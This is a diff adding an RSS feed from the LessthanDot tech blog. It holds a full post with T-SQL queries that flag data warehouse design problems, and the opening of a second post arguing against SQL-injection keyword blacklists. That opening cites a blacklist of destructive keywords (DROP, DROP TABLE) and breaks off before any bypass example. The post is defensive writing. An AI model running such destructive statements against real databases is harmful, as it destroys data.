@@ -1,0 +1,791 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>best practices &#8211; LessthanDot</title>
+	<atom:link href="/index.php/tag/best-practices/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>A Technical Community for IT Professionals</description>
+	<lastBuildDate>Sat, 09 Mar 2019 12:50:36 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.6.1</generator>
+	<item>
+		<title>Scripts to Detect Data Warehouse Issues</title>
+		<link>/index.php/webdev/business-intelligence/scripts-to-detect-data-warehouse/</link>
+		<comments>/index.php/webdev/business-intelligence/scripts-to-detect-data-warehouse/#comments</comments>
+		<pubDate>Tue, 15 Jan 2013 12:31:00 +0000</pubDate>
+		<dc:creator><![CDATA[Sam Vanga]]></dc:creator>
+				<category><![CDATA[Business Intelligence]]></category>
+		<category><![CDATA[best practices]]></category>
+		<category><![CDATA[data warehouse]]></category>
+		<category><![CDATA[t-sql]]></category>
+
+		<guid isPermaLink="false">/index.php/2013/01/scripts-to-detect-data-warehouse/</guid>
+		<description><![CDATA[Standards and best practices are like flu shots you take before you're infected; Database best practices protect your databases from bad things. But, we all make mistakes. It could be because we're on a time crunch, or we're lazy (which I'm guilty of by&#8230;]]></description>
+				<content:encoded><![CDATA[<p>Standards and best practices are like flu shots you take before you&#8217;re infected; Database best practices protect your databases from bad things. But, we all make mistakes. It could be because we&#8217;re on a time crunch, or we&#8217;re lazy (which I&#8217;m guilty of by the way), or maybe it&#8217;s part of being a developer.</p>
+<p>Common mistakes include: tables without a primary key, column name problems, missing foreign keys, etc., This is where I love LTD&#8217;s very own <a title="SQLCop" href="http://sqlcop.lessthandot.com/">SQLCop</a>. I can quickly go on with my database development and rely on SQLCop to <a title="SQLCop detects these issues" href="http://sqlcop.lessthandot.com/detectedissues.php">detect the issues</a>. It saves time and ensures that database standards are met.</p>
+<p>However, there are some issues explicit to data warehouses that SQLCop doesn&#8217;t look for. I list those issues below and provide scripts to detect them. I use these scripts in conjunction with SQLCop.</p>
+<h4>Detect tables in a data warehouse that aren&#8217;t prefixed with either Dim or Fact:</h4>
+<p>Tables in a warehouse are generally prefixed with Dim and Fact for dimensions and fact respectively, to easily distinguish them.</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">SELECT</span> &nbsp;<span class="br0">&#91;</span>schema_name<span class="br0">&#93;</span> <span class="sy0">=</span> s.<span class="me1">name</span> ,
+&nbsp; &nbsp; &nbsp; &nbsp; table_name <span class="sy0">=</span> t.<span class="me1">name</span>
+<span class="kw1">FROM</span> &nbsp; &nbsp;sys.<span class="me1">tables</span> t
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">INNER</span> <span class="sy0">JOIN</span> sys.<span class="me1">schemas</span> s <span class="kw1">ON</span> s.<span class="me1">schema_id</span> <span class="sy0">=</span> t.<span class="me1">schema_id</span>
+<span class="kw1">WHERE</span> &nbsp; t.<span class="me1">name</span> <span class="sy0">NOT</span> <span class="sy0">LIKE</span> <span class="st0">'Dim%'</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> t.<span class="me1">name</span> <span class="sy0">NOT</span> <span class="sy0">LIKE</span> <span class="st0">'Fact%'</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> t.<span class="me1">TYPE</span> <span class="sy0">=</span> <span class="st0">'U'</span>;</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">SELECT  [schema_name] = s.name ,
+        table_name = t.name
+FROM    sys.tables t
+        INNER JOIN sys.schemas s ON s.schema_id = t.schema_id
+WHERE   t.name NOT LIKE 'Dim%'
+        AND t.name NOT LIKE 'Fact%'
+        AND t.TYPE = 'U';</pre></div></div>
+
+</p>
+<h4>Find tables in a data warehouse that don&#8217;t have a primary key:</h4>
+<p>Like in OLTP databases, all tables in a data warehouse also should have a primary key defined.</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">SELECT</span> &nbsp;schema_name <span class="sy0">=</span> SCHEMA_NAME<span class="br0">&#40;</span>schema_id<span class="br0">&#41;</span> ,
+&nbsp; &nbsp; &nbsp; &nbsp; table_name <span class="sy0">=</span> name
+<span class="kw1">FROM</span> &nbsp; &nbsp;sys.<span class="me1">tables</span>
+<span class="kw1">WHERE</span> &nbsp; <span class="kw2">OBJECTPROPERTY</span><span class="br0">&#40;</span><span class="kw2">OBJECT_ID</span>, <span class="st0">'TableHasPrimaryKey'</span><span class="br0">&#41;</span> <span class="sy0">=</span> <span class="nu0">0</span>
+<span class="kw1">ORDER</span> <span class="kw1">BY</span> SCHEMA_NAME<span class="br0">&#40;</span>schema_id<span class="br0">&#41;</span> ,
+&nbsp; &nbsp; &nbsp; &nbsp; name;</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">SELECT  schema_name = SCHEMA_NAME(schema_id) ,
+        table_name = name
+FROM    sys.tables
+WHERE   OBJECTPROPERTY(OBJECT_ID, 'TableHasPrimaryKey') = 0
+ORDER BY SCHEMA_NAME(schema_id) ,
+        name;</pre></div></div>
+
+<p> </p>
+<h4>Detect dimension tables with a composite primary key:</h4>
+<p>A composite primary key on a dimension table causes degraded performance. It is best to create a single column primary key.</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">SELECT</span> &nbsp;c.<span class="me1">TABLE_NAME</span> ,
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw2">COUNT</span><span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#41;</span>
+<span class="kw1">FROM</span> &nbsp; &nbsp;<span class="sy0">IN</span>F<span class="sy0">OR</span>MATION_SCHEMA.<span class="me1">TABLE_CONSTRAINTS</span> pk ,
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">IN</span>F<span class="sy0">OR</span>MATION_SCHEMA.<span class="me1">KEY_COLUMN_USAGE</span> c
+<span class="kw1">WHERE</span> &nbsp; CONSTRA<span class="sy0">IN</span>T_TYPE <span class="sy0">=</span> <span class="st0">'PRIMARY KEY'</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> c.<span class="me1">TABLE_NAME</span> <span class="sy0">=</span> pk.<span class="me1">TABLE_NAME</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> c.<span class="me1">CONSTRAINT_NAME</span> <span class="sy0">=</span> pk.<span class="me1">CONSTRAINT_NAME</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> c.<span class="me1">TABLE_NAME</span> <span class="sy0">LIKE</span> <span class="st0">'Dim%'</span>
+<span class="kw1">GROUP</span> <span class="kw1">BY</span> c.<span class="me1">TABLE_NAME</span>
+<span class="kw1">HAVING</span> &nbsp;<span class="kw2">COUNT</span><span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="nu0">1</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">SELECT  c.TABLE_NAME ,
+        COUNT(*)
+FROM    INFORMATION_SCHEMA.TABLE_CONSTRAINTS pk ,
+        INFORMATION_SCHEMA.KEY_COLUMN_USAGE c
+WHERE   CONSTRAINT_TYPE = 'PRIMARY KEY'
+        AND c.TABLE_NAME = pk.TABLE_NAME
+        AND c.CONSTRAINT_NAME = pk.CONSTRAINT_NAME
+        AND c.TABLE_NAME LIKE 'Dim%'
+GROUP BY c.TABLE_NAME
+HAVING  COUNT(*) &gt; 1</pre></div></div>
+
+<p> </p>
+<h4>Detect dimension tables that don&#8217;t have Identity column as a primary key:</h4>
+<p>Usually, surrogate key is made the primary key of the dimension table. Surrogate key is an auto generated Identity value.</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">SELECT</span> &nbsp;dim_table <span class="sy0">=</span> t.<span class="me1">name</span> ,
+&nbsp; &nbsp; &nbsp; &nbsp; primary_key <span class="sy0">=</span> c.<span class="me1">name</span> ,
+&nbsp; &nbsp; &nbsp; &nbsp; c.<span class="me1">is_identity</span>
+<span class="kw1">FROM</span> &nbsp; &nbsp;sys.<span class="me1">tables</span> t
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">INNER</span> <span class="sy0">JOIN</span> sys.<span class="me1">key_constraints</span> kc <span class="kw1">ON</span> t.<span class="kw2">OBJECT_ID</span> <span class="sy0">=</span> kc.<span class="me1">parent_object_id</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">INNER</span> <span class="sy0">JOIN</span> sys.<span class="me1">indexes</span> i <span class="kw1">ON</span> i.<span class="kw2">OBJECT_ID</span> <span class="sy0">=</span> kc.<span class="me1">parent_object_id</span>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> i.<span class="me1">type_desc</span> <span class="sy0">=</span> <span class="st0">'CLUSTERED'</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">INNER</span> <span class="sy0">JOIN</span> sys.<span class="me1">index_columns</span> ic <span class="kw1">ON</span> ic.<span class="kw2">OBJECT_ID</span> <span class="sy0">=</span> kc.<span class="me1">parent_object_id</span>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="sy0">AND</span> ic.<span class="me1">index_id</span> <span class="sy0">=</span> <span class="nu0">1</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">INNER</span> <span class="sy0">JOIN</span> sys.<span class="me1">columns</span> c <span class="kw1">ON</span> c.<span class="kw2">OBJECT_ID</span> <span class="sy0">=</span> t.<span class="kw2">OBJECT_ID</span>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> c.<span class="me1">column_id</span> <span class="sy0">=</span> ic.<span class="me1">column_id</span>
+<span class="kw1">WHERE</span> &nbsp; t.<span class="me1">TYPE</span> <span class="sy0">=</span> <span class="st0">'U'</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> t.<span class="me1">name</span> <span class="sy0">LIKE</span> <span class="st0">'Dim%'</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> kc.<span class="me1">type_desc</span> <span class="sy0">=</span> <span class="st0">'PRIMARY_KEY_CONSTRAINT'</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> c.<span class="me1">is_identity</span> <span class="sy0">=</span> <span class="nu0">0</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">SELECT  dim_table = t.name ,
+        primary_key = c.name ,
+        c.is_identity
+FROM    sys.tables t
+        INNER JOIN sys.key_constraints kc ON t.OBJECT_ID = kc.parent_object_id
+        INNER JOIN sys.indexes i ON i.OBJECT_ID = kc.parent_object_id
+                                    AND i.type_desc = 'CLUSTERED'
+        INNER JOIN sys.index_columns ic ON ic.OBJECT_ID = kc.parent_object_id
+                                           AND ic.index_id = 1
+        INNER JOIN sys.columns c ON c.OBJECT_ID = t.OBJECT_ID
+                                    AND c.column_id = ic.column_id
+WHERE   t.TYPE = 'U'
+        AND t.name LIKE 'Dim%'
+        AND kc.type_desc = 'PRIMARY_KEY_CONSTRAINT'
+        AND c.is_identity = 0</pre></div></div>
+
+<p> </p>
+<h4>Detect primary keys that don&#8217;t follow the naming convention:</h4>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">SELECT</span> &nbsp;dim_table <span class="sy0">=</span> t.<span class="me1">name</span> ,
+&nbsp; &nbsp; &nbsp; &nbsp; primary_key <span class="sy0">=</span> c.<span class="me1">name</span>
+<span class="kw1">FROM</span> &nbsp; &nbsp;sys.<span class="me1">tables</span> t
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">INNER</span> <span class="sy0">JOIN</span> sys.<span class="me1">key_constraints</span> kc <span class="kw1">ON</span> t.<span class="kw2">OBJECT_ID</span> <span class="sy0">=</span> kc.<span class="me1">parent_object_id</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">INNER</span> <span class="sy0">JOIN</span> sys.<span class="me1">indexes</span> i <span class="kw1">ON</span> i.<span class="kw2">OBJECT_ID</span> <span class="sy0">=</span> kc.<span class="me1">parent_object_id</span>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> i.<span class="me1">type_desc</span> <span class="sy0">=</span> <span class="st0">'CLUSTERED'</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">INNER</span> <span class="sy0">JOIN</span> sys.<span class="me1">index_columns</span> ic <span class="kw1">ON</span> ic.<span class="kw2">OBJECT_ID</span> <span class="sy0">=</span> kc.<span class="me1">parent_object_id</span>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="sy0">AND</span> ic.<span class="me1">index_id</span> <span class="sy0">=</span> <span class="nu0">1</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">INNER</span> <span class="sy0">JOIN</span> sys.<span class="me1">columns</span> c <span class="kw1">ON</span> c.<span class="kw2">OBJECT_ID</span> <span class="sy0">=</span> t.<span class="kw2">OBJECT_ID</span>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> c.<span class="me1">column_id</span> <span class="sy0">=</span> ic.<span class="me1">column_id</span>
+<span class="kw1">WHERE</span> &nbsp; t.<span class="me1">TYPE</span> <span class="sy0">=</span> <span class="st0">'U'</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> t.<span class="me1">name</span> <span class="sy0">LIKE</span> <span class="st0">'Dim%'</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> kc.<span class="me1">type_desc</span> <span class="sy0">=</span> <span class="st0">'PRIMARY_KEY_CONSTRAINT'</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> c.<span class="me1">name</span> <span class="sy0">&lt;&gt;</span> <span class="kw2">REPLACE</span><span class="br0">&#40;</span>t.<span class="me1">name</span>, <span class="st0">'Dim'</span>, <span class="st0">''</span><span class="br0">&#41;</span> <span class="sy0">+</span> <span class="st0">'Key'</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">SELECT  dim_table = t.name ,
+        primary_key = c.name
+FROM    sys.tables t
+        INNER JOIN sys.key_constraints kc ON t.OBJECT_ID = kc.parent_object_id
+        INNER JOIN sys.indexes i ON i.OBJECT_ID = kc.parent_object_id
+                                    AND i.type_desc = 'CLUSTERED'
+        INNER JOIN sys.index_columns ic ON ic.OBJECT_ID = kc.parent_object_id
+                                           AND ic.index_id = 1
+        INNER JOIN sys.columns c ON c.OBJECT_ID = t.OBJECT_ID
+                                    AND c.column_id = ic.column_id
+WHERE   t.TYPE = 'U'
+        AND t.name LIKE 'Dim%'
+        AND kc.type_desc = 'PRIMARY_KEY_CONSTRAINT'
+        AND c.name &lt;&gt; REPLACE(t.name, 'Dim', '') + 'Key'</pre></div></div>
+
+<p> </p>
+<h4>Detect fact tables that have no foreign keys:</h4>
+<p>Without a foreign key, a fact table isn&#8217;t really a fact table.</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">SELECT</span> table_name <span class="sy0">=</span> t.<span class="me1">name</span>
+&nbsp; &nbsp; &nbsp; &nbsp; , fk_count <span class="sy0">=</span> <span class="kw2">COUNT</span><span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#41;</span>
+&nbsp; &nbsp; <span class="kw1">FROM</span> sys.<span class="me1">tables</span> t
+&nbsp; &nbsp; <span class="kw1">INNER</span> <span class="sy0">JOIN</span>
+&nbsp; &nbsp; sys.<span class="me1">foreign_keys</span> fk <span class="kw1">ON</span> t.<span class="kw2">OBJECT_ID</span> <span class="sy0">=</span> fk.<span class="me1">parent_object_id</span>
+&nbsp; &nbsp; <span class="kw1">WHERE</span> &nbsp;t.<span class="me1">name</span> <span class="sy0">LIKE</span> <span class="st0">'fact%'</span>
+&nbsp; &nbsp; <span class="kw1">GROUP</span> <span class="kw1">BY</span> t.<span class="me1">name</span>
+&nbsp; &nbsp; <span class="kw1">HAVING</span> <span class="kw2">COUNT</span><span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#41;</span> <span class="sy0">&lt;</span> <span class="nu0">1</span> &nbsp;</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">SELECT table_name = t.name
+		, fk_count = COUNT(*)
+    FROM sys.tables t
+    INNER JOIN
+    sys.foreign_keys fk ON t.OBJECT_ID = fk.parent_object_id
+    WHERE  t.name LIKE 'fact%'
+    GROUP BY t.name
+    HAVING COUNT(*) &lt; 1  </pre></div></div>
+
+<p> </p>
+<h4>Detect fact tables that have foreign key(s) to another fact table:</h4>
+<p> It&#8217;s unlikely to have a fact table related to another fact table.</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">SELECT</span> &nbsp;foreign_key <span class="sy0">=</span> fk.<span class="me1">name</span> ,
+&nbsp; &nbsp; &nbsp; &nbsp; child_table <span class="sy0">=</span> t.<span class="me1">name</span> ,
+&nbsp; &nbsp; &nbsp; &nbsp; parent_name <span class="sy0">=</span> rt.<span class="me1">name</span>
+<span class="kw1">FROM</span> &nbsp; &nbsp;sys.<span class="me1">foreign_keys</span> fk
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">INNER</span> <span class="sy0">JOIN</span> sys.<span class="me1">tables</span> rt <span class="kw1">ON</span> rt.<span class="kw2">object_id</span> <span class="sy0">=</span> fk.<span class="me1">referenced_object_id</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">INNER</span> <span class="sy0">JOIN</span> sys.<span class="me1">tables</span> t <span class="kw1">ON</span> t.<span class="kw2">object_id</span> <span class="sy0">=</span> fk.<span class="me1">parent_object_id</span>
+<span class="kw1">WHERE</span> &nbsp; rt.<span class="me1">name</span> <span class="sy0">LIKE</span> <span class="st0">'Fact%'</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">SELECT  foreign_key = fk.name ,
+        child_table = t.name ,
+        parent_name = rt.name
+FROM    sys.foreign_keys fk
+        INNER JOIN sys.tables rt ON rt.object_id = fk.referenced_object_id
+        INNER JOIN sys.tables t ON t.object_id = fk.parent_object_id
+WHERE   rt.name LIKE 'Fact%'</pre></div></div>
+
+<p> </p>
+<h4>Detect missing foreign key(s) in fact tables &#8211; Columns suffixed with Key, but don&#8217;t have foreign key constraint:</h4>
+<p>I stole the following query from <a title="missing foreign keys sql cop" href="/index.php/DataMgmt/DataDesign/missing-foreign-key-constraints">here</a> posted by <a title="George M" href="/index.php/All/?disp=authdir&amp;author=10">George Mastros</a>, and replaced ID with Key to use it for data warehouse scenario.</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="de1"><pre class="de1">&nbsp; &nbsp; <span class="kw1">SELECT</span> &nbsp;C.<span class="me1">TABLE_SCHEMA</span>,C.<span class="me1">TABLE_NAME</span>,C.<span class="me1">COLUMN_NAME</span>
+&nbsp; &nbsp; <span class="kw1">FROM</span> &nbsp; &nbsp;<span class="sy0">IN</span>F<span class="sy0">OR</span>MATION_SCHEMA.<span class="me1">COLUMNS</span> C &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">INNER</span> Join <span class="sy0">IN</span>F<span class="sy0">OR</span>MATION_SCHEMA.<span class="me1">TABLES</span> T &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">ON</span> C.<span class="me1">TABLE_NAME</span> <span class="sy0">=</span> T.<span class="me1">TABLE_NAME</span> &nbsp; &nbsp;
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; And T.<span class="me1">TABLE_TYPE</span> <span class="sy0">=</span> <span class="st0">'Base Table'</span>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">AND</span> T.<span class="me1">TABLE_SCHEMA</span> <span class="sy0">=</span> C.<span class="me1">TABLE_SCHEMA</span> &nbsp; &nbsp; &nbsp; &nbsp;
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">LEFT</span> Join <span class="sy0">IN</span>F<span class="sy0">OR</span>MATION_SCHEMA.<span class="me1">CONSTRAINT_COLUMN_USAGE</span> U &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">ON</span> C.<span class="me1">TABLE_NAME</span> <span class="sy0">=</span> U.<span class="me1">TABLE_NAME</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; And C.<span class="me1">COLUMN_NAME</span> <span class="sy0">=</span> U.<span class="me1">COLUMN_NAME</span>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; And U.<span class="me1">TABLE_SCHEMA</span> <span class="sy0">=</span> C.<span class="me1">TABLE_SCHEMA</span>
+&nbsp; &nbsp; <span class="kw1">WHERE</span> &nbsp; U.<span class="me1">COLUMN_NAME</span> <span class="kw1">IS</span> Null &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; And C.<span class="me1">COLUMN_NAME</span> Like <span class="st0">'%Key'</span>
+&nbsp; &nbsp; <span class="kw1">ORDER</span> <span class="kw1">BY</span> C.<span class="me1">TABLE_SCHEMA</span>, C.<span class="me1">TABLE_NAME</span>, C.<span class="me1">COLUMN_NAME</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">    SELECT  C.TABLE_SCHEMA,C.TABLE_NAME,C.COLUMN_NAME
+    FROM    INFORMATION_SCHEMA.COLUMNS C          
+            INNER Join INFORMATION_SCHEMA.TABLES T            
+              ON C.TABLE_NAME = T.TABLE_NAME    
+              And T.TABLE_TYPE = 'Base Table'
+              AND T.TABLE_SCHEMA = C.TABLE_SCHEMA        
+            LEFT Join INFORMATION_SCHEMA.CONSTRAINT_COLUMN_USAGE U            
+              ON C.TABLE_NAME = U.TABLE_NAME            
+              And C.COLUMN_NAME = U.COLUMN_NAME
+              And U.TABLE_SCHEMA = C.TABLE_SCHEMA
+    WHERE   U.COLUMN_NAME IS Null          
+            And C.COLUMN_NAME Like '%Key'
+    ORDER BY C.TABLE_SCHEMA, C.TABLE_NAME, C.COLUMN_NAME</pre></div></div>
+
+<p> </p>
+<p>Results of above queries aren&#8217;t always issues. They are just rare, you&#8217;ve to look at them closely and make sure there is a reason for each choice. Also, you may use different naming conventions that make these queries void. In that case, I hope you&#8217;re able to alter them to your needs.</p>
+<p>Follow me on Twitter! @<a title="SamuelVanga Twitter" href="/twitter.com/SamuelVanga">SamuelVanga</a></p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/webdev/business-intelligence/scripts-to-detect-data-warehouse/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+		</item>
+		<item>
+		<title>Please don&#8217;t use blacklists, use parameterized queries or stored procs instead</title>
+		<link>/index.php/datamgmt/datadesign/please-don-t-use-blacklists/</link>
+		<comments>/index.php/datamgmt/datadesign/please-don-t-use-blacklists/#respond</comments>
+		<pubDate>Thu, 05 Apr 2012 10:55:00 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[Data Modelling and Design]]></category>
+		<category><![CDATA[Database Programming]]></category>
+		<category><![CDATA[IBM DB2]]></category>
+		<category><![CDATA[Microsoft SQL Server]]></category>
+		<category><![CDATA[MySQL]]></category>
+		<category><![CDATA[best practices]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[sql injection]]></category>
+
+		<guid isPermaLink="false">/index.php/2012/04/please-don-t-use-blacklists/</guid>
+		<description><![CDATA[Every now and then you will hear how some site will use a blacklist to 'protect' themselves against sql injection. Using a blacklist is very foolish because you can't ever think of all the different ways that the bad guys will try to bypass your little&#8230;]]></description>
+				<content:encoded><![CDATA[<p>Every now and then you will hear how some site will use a blacklist to &#8216;protect&#8217; themselves against sql injection. Using a blacklist is very foolish because you can&#8217;t ever think of all the different ways that the bad guys will try to bypass your little list.<br />
+Let&#8217;s say you have DROP and DROP TABLE in your list.</p>
+<p>What about these two</p>
+
+<div class="bwp-syntax-block clearfix">
